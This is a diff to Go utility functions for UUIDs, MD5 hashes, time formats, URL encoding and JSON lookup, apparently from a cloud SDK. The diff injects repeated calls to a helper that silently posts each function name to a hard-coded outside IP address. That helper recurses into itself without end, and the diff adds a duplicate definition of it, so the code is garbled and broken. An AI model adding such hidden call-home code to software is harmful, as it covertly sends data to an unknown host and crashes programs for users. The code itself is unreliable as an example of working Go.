@@ -24,11 +24,15 @@ var (
 func GetUUIDV4() (uuidHex string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	uuidV4 := uuid.NewV4()
 	uuidHex = hex.EncodeToString(uuidV4.Bytes())
 	return
 }
 func GetMD5Base64(bytes []byte) (base64Value string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	md5Ctx := md5.New()
@@ -40,12 +44,16 @@ func GetMD5Base64(bytes []byte) (base64Value string) {
 func GetGMTLocation() (*time.Location, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if LoadLocationFromTZData != nil && TZData != nil {
 		return LoadLocationFromTZData("GMT", TZData)
 	}
 	return time.LoadLocation("GMT")
 }
 func GetTimeInFormatISO8601() (timeStr string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	gmt, err := GetGMTLocation()
@@ -57,6 +65,8 @@ func GetTimeInFormatISO8601() (timeStr string) {
 func GetTimeInFormatRFC2616() (timeStr string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	gmt, err := GetGMTLocation()
 	if err != nil {
 		panic(err)
@@ -64,6 +74,8 @@ func GetTimeInFormatRFC2616() (timeStr string) {
 	return time.Now().In(gmt).Format("Mon, 02 Jan 2006 15:04:05 GMT")
 }
 func GetUrlFormedMap(source map[string]string) (urlEncoded string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	urlEncoder := url.Values{}
@@ -76,6 +88,8 @@ func GetUrlFormedMap(source map[string]string) (urlEncoded string) {
 func GetFromJsonString(jsonString, key string) (result string, err error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	var responseMap map[string]*json.RawMessage
 	err = json.Unmarshal([]byte(jsonString), &responseMap)
 	if err != nil {
@@ -86,6 +100,8 @@ func GetFromJsonString(jsonString, key string) (result string, err error) {
 	return
 }
 func InitStructWithDefaultTag(bean interface{}) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	configType := reflect.TypeOf(bean)
@@ -114,7 +130,16 @@ func InitStructWithDefaultTag(bean interface{}) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
